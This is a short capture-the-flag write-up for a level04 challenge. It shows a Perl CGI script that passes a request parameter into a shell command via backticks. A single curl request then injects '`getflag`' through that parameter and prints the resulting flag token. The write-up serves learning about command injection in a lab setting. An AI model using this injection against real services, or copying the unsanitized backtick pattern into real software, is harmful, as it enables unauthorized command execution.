When we started the level04, in the home of the user we found the perl file **level04.pl**

It looks like this:
```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

The relevent parts are:
- the second line:
```pl
# localhost:4747
```
Which hint us to use curl to call the perl script.

- and the function x:

```pl
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

Which print $y, which is the param x, said here:
```pl
x(param("x"));
```

while making ls -l, we can see:

```bash
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
```
Which means that like in the previous flag, the script as permission to execute getflag as flag04.

We then use curl to call the scipt:

```bash
curl -X POST http://localhost:4747/level04.pl  -d 'x=`getflag`'
```

and we got:

```bash
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```
